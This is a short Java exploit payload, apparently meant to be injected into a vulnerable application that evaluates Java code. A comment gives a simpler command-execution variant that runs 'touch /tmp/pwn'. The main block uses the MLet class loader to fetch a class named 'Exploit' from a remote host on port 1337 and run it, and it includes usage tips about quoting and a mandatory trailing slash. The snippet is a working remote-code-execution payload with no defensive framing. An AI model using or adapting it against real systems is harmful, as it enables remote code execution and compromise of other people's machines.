// Please use double quotes, as they get properly escaped.
// More simple payload:
// java.lang.Runtime.getRuntime().exec("touch /tmp/pwn");
new Runnable(){
    @Override public void run() {
        try {
            var mlet = new javax.management.loading.MLet();
            mlet.addURL("http://host.docker.internal:1337/"); // The trailing slash is mandatory!
            mlet.loadClass("Exploit");
        } catch (javax.management.ServiceNotFoundException | java.lang.ClassNotFoundException e) {
            System.out.println(e.getMessage());
        }
    }
}.run();
